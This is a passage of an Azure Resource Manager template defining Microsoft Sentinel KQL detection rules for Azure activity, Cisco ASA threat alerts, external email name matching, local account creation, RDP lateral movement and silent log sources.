)\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n}; \nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n  let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n  | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n      let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n  | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n      table_parameter\n      | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n      | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n      | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n      | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n      | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n      | extend ModifiedRBAScore = case(\n        ModifiedRBAScore > 10, 10.0\n        , ModifiedRBAScore <0.1, 0.1\n        , ModifiedRBAScore\n      )\n      | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nAzureActivity\n| where TimeGenerated >= ago(start_time + latency) and TimeGenerated < end_time\n| where OperationNameValue has_any (A056_MONITORED_AZURE_ACTIVITIES) and ActivityStatusValue =~ 'Success'\n| summarize\nNumberOfActivities=count(),\nFirst=min(TimeGenerated),\nLast=max(TimeGenerated),\nOperations = make_set(OperationNameValue, 5)\n  , bv_object_attr = make_set(ResourceGroup, 5)\n  , arg_max(TimeGenerated, *)\nby\nHostCustomEntity = Caller,\n  bin(TimeGenerated, 1h)\n  , IPAddresses=CallerIpAddress, 5\n| sort by NumberOfActivities desc\n|extend bv_user = HostCustomEntity\n  , bv_src_ip = IPAddresses\n  , bv_vendor_action = Operations\n  , bv_start_time = First\n|project-reorder bv*\n | extend  bv_alarm_attacker_entities = pack_array(todynamic(bv_user))\n  , bv_dedup_hash = hash_sha1(tolower(bv_user))\n| invoke match(exclusions, 'exclusion')\n| extend excluded = iff((visibility contains '0'), true, false)\n| where excluded == false\n| invoke description()\n| where BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash\n| extend bv_alarm_rba_score =  BV_FUN_CALC_RBA(alert_id,visibility,rba_score)      ",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1578"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-056: [RBA] AzureActivity - Monitored Activity Performed by {{bv_user}}",
            "alertDescriptionFormat": "Generates an event when monitored activities are performed\n\n{{ExtendedDescription}}\n\nMITRE: T1578\nCategory: Azure Activity\ntag: RBA"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a5604397-f6db-420c-9269-7dc049b72839')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a5604397-f6db-420c-9269-7dc049b72839')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Cisco ASA - threat detection message fired",
          "description": "Identifies when the Cisco ASA Threat Detection engine fired an alert based on malicious activity occurring on the network inicated by DeviceEventClassID 733101-733105\nResources: https://www.cisco.com/c/en/us/td/docs/security/asa/syslog/b_syslog/syslogs9.html\nDetails on how to further troubleshoot/investigate: https://www.cisco.com/c/en/us/support/docs/security/asa-5500-x-series-next-generation-firewalls/113685-asa-threat-detection.html",
          "severity": "Medium",
          "enabled": true,
          "query": "CommonSecurityLog\n| where isempty(CommunicationDirection)\n| where DeviceEventClassID in (\"733101\",\"733102\",\"733103\",\"733104\",\"733105\")\n| where Message !has \"%ASA-4-733102: Threat-detection adds host 172.24.31.243 to shun list\"\n| where Message !has \"%ASA-4-733103: Threat-detection removes host 172.24.31.243 from shun list\"\n| where Message !contains \"%ASA-4-733:  Threat-detection host 172.24 to shun list\"\n| extend HostName = tostring(split(DeviceName, \".\")[0]), DomainIndex = toint(indexof(DeviceName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(DeviceName, DomainIndex + 1), DeviceName)\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery",
            "Impact"
          ],
          "techniques": [
            "T1046",
            "T1498"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "795edf2d-cf3e-45b5-8452-fe6c9e6a582e",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/4cfbf7d2-8fd2-47e3-bfcf-341b5c9d90e0')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/4cfbf7d2-8fd2-47e3-bfcf-341b5c9d90e0')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "External Emails with Name Matching",
          "description": "Review emails sent externally that match either the first or last name. For example: John.Doe@company sent an email to John.Doe@gmail.com\n\nReview all emails in the events for any abnormal frequency or subject lines.",
          "severity": "Medium",
          "enabled": true,
          "query": "EmailEvents\r\n| join kind=leftouter ( // left outer join to include emails without attachments\r\n    EmailAttachmentInfo \r\n    | summarize FileNames = make_set(FileName), FileSize = sum(FileSize) by NetworkMessageId // gathers attachment file names and sums file sizes for each email\r\n    )\r\n    on NetworkMessageId\r\n| extend senderUsername = tostring(split(SenderFromAddress, \"@\")[0])\r\n| extend recipientUsername = tostring(split(RecipientEmailAddress, \"@\")[0])\r\n| extend senderNameParts = split(senderUsername, \".\") // Split by dot, can add other delimiters\r\n| extend recipientNameParts = split(recipientUsername, \".\") // Split by dot\r\n| mv-expand senderNamePart = senderNameParts to typeof(string)\r\n| mv-expand recipientNamePart = recipientNameParts to typeof(string)\r\n| where recipientNamePart contains senderNamePart and strlen(senderNamePart) > 2 // Avoid matching single characters like 'g' in 'greg' if not desired\r\n| where SenderFromAddress != RecipientEmailAddress // Ignoring emails sent to and from same address\r\n| where EmailDirection == \"Outbound\" // Only showing emails being sent externally\r\n| where SenderFromAddress !contains \"dcssitsm@servicenowservices.com\" // known email\r\n| where SenderFromAddress !contains \"postmaster@cadcss.onmicrosoft.com\" // known email \r\n| distinct TimeGenerated, SenderFromAddress, RecipientEmailAddress, senderUsername, recipientUsername, Subject, AttachmentCount, FileSize, tostring(FileNames)// To avoid duplicate alerts if multiple parts match\r\n| project TimeGenerated, SenderFromAddress, RecipientEmailAddress, senderUsername, recipientUsername, Subject, AttachmentCount, FileSize, tostring(FileNames)\r\n| sort by FileSize desc ",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": "2025-06-18T19:00:00.000Z",
          "tactics": [
            "Exfiltration"
          ],
          "techniques": [
            "T1048",
            "T1639"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDynamicProperties": []
          },
          "customDetails": {},
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "RecipientEmailAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10526')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10526')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10526: [Custom] Windows - Local User Account Created",
          "description": "Identifies when a user account has been created. A local account is considered an account that is not part of the Windows AD domain(s) set in the AD_DOMAINS constant. MITRE: T1098 Category: Windows Security Events tag: Custom",
          "severity": "Low",
          "enabled": true,
          "query": "let EventIDList = dynamic([4720]);\nlet start_time = 1h;\nlet end_time = now();\nlet latency = 1h;\nlet alert_bin = 1h;\nSecurityEvent\n|where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| extend ComputerName = toupper(Computer)\n| where EventID in (EventIDList)\n| parse SubjectAccount with SubjectDomain '\\\\' SubjectUser\n| parse TargetAccount with TargetDomain '\\\\' TargetUser\n| where SubjectDomain !in (AD_DOMAINS) and 'ADDOMAIN' !in~ (AD_DOMAINS)\n| summarize bv_event_count = count(), bv_start_time = min(TimeGenerated), bv_dest_user = make_set(TargetAccount, 10), bv_dest_dvc = make_set(ComputerName, 10) by bv_src_user = SubjectUser, bin_at(TimeGenerated, alert_bin, now())\n| parse bv_src_user with bv_src_user_domain '\\\\' bv_src_username\n| extend ExtendedDescription = strcat(\n    'bv_start_time: ', bv_start_time\n    ,'\\nbv_src_user: ', bv_src_user\n    ,'\\nbv_dest_dvc: ', bv_dest_dvc\n    ,'\\nbv_dest_user: ', bv_dest_user \n    ,'\\nbv_event_count: ', bv_event_count)\n| extend VictimEntity = array_concat(bv_dest_user, bv_dest_dvc), AttackerEntity = pack_array(bv_src_user)\n| project \n    bv_start_time\n    , bv_event_count\n    , bv_src_user\n    , bv_dest_user\n    , bv_dest_dvc\n    , bv_src_user_domain\n    , bv_src_username\n    , ExtendedDescription\n    , AttackerEntity\n    , VictimEntity\n    , RBAScore = 1     ",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_username"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "bv_src_user_domain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8187264e-eb4f-4c3f-8e8a-af0c269d97f7')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8187264e-eb4f-4c3f-8e8a-af0c269d97f7')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "RDP Nesting",
          "description": "Query detects potential lateral movement within a network by identifying when an RDP connection (EventID 4624, LogonType 10) is made to an initial system, followed by a subsequent RDP connection from that system to another, using the same account within a 60-minute window.\n To reduce false positives, it excludes scenarios where the same account has made 5 or more connections to the same set of computers in the previous 7 days. This approach focuses on highlighting unusual RDP behaviour that suggests lateral movement, which is often associated with attacker tactics during a network breach.",
          "severity": "Medium",
          "enabled": true,
          "query": "let endtime = 1d;\n// Function to resolve hostname to IP address using DNS logs or a lookup table (example syntax)\nlet rdpConnections =\n(union isfuzzy=true\n(\nSecurityEvent\n| where TimeGenerated >= ago(endtime)\n| where EventID == 4624 and LogonType == 10\n// Labeling the first RDP connection time, computer and ip\n| extend\nFirstHop = bin(TimeGenerated, 1m),\nFirstComputer = toupper(Computer),\nFirstRemoteIPAddress = IpAddress,\nAccount = tolower(Account)\n),\n(\nWindowsEvent\n| where TimeGenerated >= ago(endtime)\n| where EventID == 4624 and EventData has (\"10\")\n| extend LogonType = tostring(EventData.LogonType)\n| where LogonType == 10 // Labeling the first RDP connection time, computer and ip\n| extend Account = strcat(tostring(EventData.TargetDomainName), \"\", tostring(EventData.TargetUserName))\n| extend IpAddress = tostring(EventData.IpAddress)\n| extend\nFirstHop = bin(TimeGenerated, 1m),\nFirstComputer = toupper(Computer),\nFirstRemoteIPAddress = IpAddress,\nAccount = tolower(Account)\n))\n| join kind=inner (\n(union isfuzzy=true\n(\nSecurityEvent\n| where TimeGenerated >= ago(endtime)\n| where EventID == 4624 and LogonType == 10\n// Labeling the second RDP connection time, computer and ip\n| extend\nSecondHop = bin(TimeGenerated, 1m),\nSecondComputer = toupper(Computer),\nSecondRemoteIPAddress = IpAddress,\nAccount = tolower(Account)\n),\n(\nWindowsEvent\n| where TimeGenerated >= ago(endtime)\n| where EventID == 4624 and EventData has (\"10\")\n| extend LogonType = toint(EventData.LogonType)\n| where LogonType == 10 // Labeling the second RDP connection time, computer and ip\n| extend Account = strcat(tostring(EventData.TargetDomainName), \"\", tostring(EventData.TargetUserName))\n| extend IpAddress = tostring(EventData.IpAddress)\n| extend\nSecondHop = bin(TimeGenerated, 1m),\nSecondComputer = toupper(Computer),\nSecondRemoteIPAddress = IpAddress,\nAccount = tolower(Account)\n))\n)\non Account\n| distinct\nAccount,\nFirstHop,\nFirstComputer,\nFirstRemoteIPAddress,\nSecondHop,\nSecondComputer,\nSecondRemoteIPAddress,\nAccountType,\nActivity,\nLogonTypeName,\nProcessName;\n// Resolve hostnames to IP addresses device network Ip's\nlet listOfFirstComputer = rdpConnections | distinct FirstComputer;\nlet listOfSecondComputer = rdpConnections | distinct SecondComputer;\nlet resolvedIPs =\nDeviceNetworkInfo\n| where TimeGenerated >= ago(endtime)\n| where isnotempty(ConnectedNetworks) and NetworkAdapterStatus == \"Up\"\n| extend ClientIP = tostring(parse_json(IPAddresses[0]).IPAddress)\n| where isnotempty(ClientIP)\n| where DeviceName in~ (listOfFirstComputer) or DeviceName in~ (listOfSecondComputer)\n| summarize arg_max(TimeGenerated, ClientIP) by Computer= DeviceName\n| project Computer=toupper(Computer), ResolvedIP = ClientIP;\n// Join resolved IPs with the RDP connections\nrdpConnections\n| join kind=inner (resolvedIPs) on $left.FirstComputer == $right.Computer\n| join kind=inner (resolvedIPs) on $left.SecondComputer == $right.Computer\n// | where ResolvedIP != ResolvedIP1\n| distinct\nAccount,\nFirstHop,\nFirstComputer,\nFirstComputerIP = ResolvedIP,\nFirstRemoteIPAddress,\nSecondHop,\nSecondComputer,\nSecondComputerIP = ResolvedIP1,\nSecondRemoteIPAddress,\nAccountType,\nActivity,\nLogonTypeName,\nProcessName\n// Ensure the first connection is before the second connection\n// Identify only RDP to another computer from within the first RDP connection by only choosing matches where the Computer names do not match\n// Ensure the IPAddresses do not match by excluding connections from the same computers with first hop RDP connections to multiple computers\n| where FirstComputer != SecondComputer\nand FirstRemoteIPAddress != SecondRemoteIPAddress\nand SecondHop > FirstHop\n// Ensure the second hop occurs within 30 minutes of the first hop\n| where SecondHop <= FirstHop + 30m\n| where SecondRemoteIPAddress == FirstComputerIP\n| summarize FirstHopFirstSeen = min(FirstHop), FirstHopLastSeen = max(FirstHop)\nby\nAccount,\nFirstComputer,\nFirstComputerIP,\nFirstRemoteIPAddress,\nSecondHop,\nSecondComputer,\nSecondComputerIP,\nSecondRemoteIPAddress,\nAccountType,\nActivity,\nLogonTypeName,\nProcessName\n| extend\nAccountName = tostring(split(Account, @\"\")[1]),\nAccountNTDomain = tostring(split(Account, @\"\")[0])\n| extend\nHostName1 = tostring(split(FirstComputer, \".\")[0]),\nDomainIndex = toint(indexof(FirstComputer, '.'))\n| extend HostNameDomain1 = iff(DomainIndex != -1, substring(FirstComputer, DomainIndex + 1), FirstComputer)\n| extend\nHostName2 = tostring(split(SecondComputer, \".\")[0]),\nDomainIndex = toint(indexof(SecondComputer, '.'))\n| extend HostNameDomain2 = iff(DomainIndex != -1, substring(SecondComputer, DomainIndex + 1), SecondComputer)\n| project-away DomainIndex\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "LateralMovement"
          ],
          "techniques": [
            "T1021"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "69a45b05-71f5-45ca-8944-2e038747fb39",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Account"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountNTDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "FirstComputer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName1"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "HostNameDomain1"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName2"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "HostNameDomain2"
                },
                {
                  "identifier": "FullName",
                  "columnName": "SecondComputer"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "FirstComputerIP"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SecondComputerIP"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "FirstRemoteIPAddress"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SecondRemoteIPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.8"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9060')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9060')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9060: [Health] Syslog - Silent - A computer has not been seen",
          "description": "This rule alerts when a Computer that consistently send data (i.e sent data in the last 10 out of 14 days) and have not reported in the last two days (configurable).\n\nThis rule will not create a new alert for a device previously reported in the last three days.\n\nThresholds can be set per Computer in A9060_CONFIGURATION MITRE:  Category: Health tag: Health",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 1d;\nlet suppression_time=3d;\nlet start_time_historical = 14d;\nlet alert_bin = 1d;\nlet max_reportable_days = 7;\nlet Threshold = iff(A9060_CONFIGURATION['Default'] == '1d' or isempty(A9060_CONFIGURATION['Default']), 3, A9060_CONFIGURATION['Default']);\n//Make a list of all previously seen computers\nlet RecentAlerts = toscalar(SecurityAlert\n| where TimeGenerated between (ago(suppression_time) .. now())\n| where AlertName startswith 'BV-9060'\n| extend Computer = todynamic(tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).Computer))[0]))\n| summarize make_set_if(Computer, isnotempty(Computer))\n);\nSyslog\n| where TimeGenerated >= ago(start_time_historical)\n| where SyslogMessage matches regex (A9060_SYSLOG_EXCLUSIONS) == false and HostIP matches regex (A9060_SYSLOG_EXCLUSIONS) == false\n| make-series EventCount=count() on TimeGenerated from ago(start_time_historical) to now() step alert_bin by Computer\n// The array_sum and check on TotalEvents to reduce noise from malformed syslog messages causing false positives\n| extend TotalEvents=array_sum(EventCount)\n| where TotalEvents > 100\n| extend (anomalies, score, baseline) = series_decompose_anomalies(EventCount)\n| mv-apply e=EventCount on (\n  summarize TotalDaysMissing=countif(e==0)\n)\n| where TotalDaysMissing < 4\n|extend TotalEventCount=array_sum(EventCount)\n|where TotalEventCount > 7000\n//Start Calculate days missing\n| extend EventCountString = strcat_array(EventCount, ',')\n| extend DaysMissingString = extract(@'[1-9]*,([,0]+)$',1,EventCountString)\n| extend DaysMissingString = replace_string(DaysMissingString, ',', '')\n| extend DaysMissing = string_size(DaysMissingString)\n//End Calculate Days Missing\n| extend bv_rule_version = '1.2.5308'\n| extend bv_rule_timestamp = '1717002234.7930908'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.2.5308 bv_rule_timestamp: 1717002234.7930908'\n| project Computer, Threshold, EventCount, anomalies, score, baseline, DaysMissing, TotalEventCount\n| extend Threshold_TimeToMonitor = iff(isnotempty(A9060_CONFIGURATION[Computer]), A9060_CONFIGURATION[Computer], Threshold)\n | where DaysMissing != 0\n//Max Numbers of days that a device will report\n | where DaysMissing between( Threshold_TimeToMonitor .. max_reportable_days)\n//Suppression for previously reported devices\n| where Computer !in (RecentAlerts)\n| where Computer matches regex A9060_EXCLUDED_COMPUTER == false\n| extend Computer_eventcount = strcat(Computer, ' - total events in 14 days: ' , toint(TotalEventCount))\n| summarize Src=make_set(Computer), Computer_eventcount=make_set(Computer_eventcount), Data=make_set(pack(\"Computer\", Computer, 'EventCount', EventCount, 'Threshold', Threshold_TimeToMonitor)), EventCount=count() , Computer_threshold=make_set(pack(\"Computer\", Computer, 'Threshold', Threshold_TimeToMonitor)) by Threshold\n| extend ExtendedDescription = strcat(\n          'Missing Computers: ', EventCount\n          ,'\\nMissing Computers (limited to 20): \\n* ', strcat_array(array_slice(Computer_threshold,0,20), '\\n* '))\n| extend AlertName = iff(array_length(Src) == 1, strcat(Src[0], ' has been missing for ', Threshold, ' days'), strcat(EventCount, ' computers have been missing'))\n| extend bv_rule_version = '1.2.5308'\n| extend bv_rule_timestamp = '1717002234.7930908'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.2.5308 bv_rule_timestamp: 1717002234.7930908'\n|extend Threshold = tostring(Threshold)\n|extend bv_start_time = now()\n  , bv_mss_category = 'LogSource Disruption'\n  , bv_alarm_type = 'Silent Device'\n  , bv_alarm_sub_type = 'EFD v1.0'\n  , bv_alarm_name = 'BV-9060'\n  , bv_alarm_severity = 'low'\n  , sourcetype = 'Syslog'\n  , bv_alarm_threshold = strcat('System missing for more than ', Threshold, ' days')\n  , bv_alarm_value = strcat(EventCount, ' systems missing')\n  , bv_severity = 'low'\n  , bv_reporting_dvc = strcat_array(array_slice(Src,0,20), '\\n* ')\n| project-keep Src\n    , Data\n    , ExtendedDescription\n    , AlertName\n    , bv_*",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9060: [Health] Syslog - {{AlertName}}",
            "alertDescriptionFormat": "This rule alerts when a Computer that consistently send data (i.e sent data in the last 10 out of 14 days) and have not reported in a configured period of time, which is 2 days by default.\n\nThis rule will not create a new alert for a device previously reported in the last three days.\n\nThresholds can be set per Computer in A9060_CONFIGURATION\n\n{{ExtendedDescription}}\n\nCategory: Syslog\ntag: Health\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "Computer": "Src"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9070')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9070')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9070: [Health] SecurityEvent - Silent - A computer has not been seen",
          "description": "This rule alerts when computers that consistently send data (i.e sent data in the last 10 out of 14 days) and have not reported in the last two days (configurable).\n\nThis rule will not create a new alert for a device previously reported in the last three days.\n\nThresholds can be set per Computer in A9070_CONFIGURATION MITRE:  Category: Windows Security Events tag: Health",
          "severity": "Informational",
          "enabled": true,
          "query": "let start_time = 1d;\nlet suppression_time=3d;\nlet start_time_historical = 14d;\nlet alert_bin = 1d;\nlet max_reportable_days = 7;\nlet Threshold = iff(A9070_CONFIGURATION['Default'] == '1d' or isempty(A9070_CONFIGURATION['Default']), 3, A9070_CONFIGURATION['Default']);\nlet RecentHeartbeats = (Heartbeat\n| where TimeGenerated between (ago(start_time) .. now())\n|extend Computer = tolower(Computer)\n| parse Computer with Computer2 '.' *\n|extend Computer = coalesce(Computer2, Computer)\n|summarize count() by Computer);\n//Make a list of all previously seen computers\nlet RecentAlerts = toscalar(SecurityAlert\n| where TimeGenerated between (ago(suppression_time) .. now())\n| where AlertName startswith 'BV-9070:' or AlertName startswith \"BV-9090:\"\n| extend Computer = todynamic(tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).Computer))[0]))\n| summarize make_set_if(Computer, isnotempty(Computer))\n);\n//Find total number of hosts\nlet TotalHosts = toscalar(SecurityEvent | where TimeGenerated > ago(start_time_historical) | summarize HostCount=dcount(Computer) | extend bv_rule_version = '1.0.4893'\n| extend bv_rule_timestamp = '1708455178.7731283'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4893 bv_rule_timestamp: 1708455178.7731283'\n| project HostCount);\nSecurityEvent\n| where isnotnull(Computer)\n|extend Computer = tolower(Computer)\n| make-series EventCount=count() on TimeGenerated from ago(start_time_historical) to now() step alert_bin by Computer\n| extend (anomalies, score, baseline) = series_decompose_anomalies(EventCount)\n| mv-apply e=EventCount on (\n  summarize TotalDaysMissing=countif(e==0)\n)\n| where TotalDaysMissing < 4\n//Start Calculate days missing\n| extend EventCountString = strcat_array(EventCount, ',')\n| extend DaysMissingString = 